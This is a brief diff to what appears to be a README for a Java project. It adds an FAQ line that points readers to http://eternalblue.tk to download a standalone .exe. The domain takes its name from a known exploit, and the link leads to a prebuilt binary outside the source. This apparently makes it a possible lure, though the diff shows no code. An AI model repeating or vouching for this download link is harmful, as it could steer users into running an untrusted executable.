@@ -45,5 +45,9 @@ Suggestions are welcome.
 
 > Press `compile` to compile the .java file
 
+- Where can I download the .exe file only?
+> Visit our website http://eternalblue.tk
+> Go to mainhub, then find software.
+
 ## Credits
  - Me :)
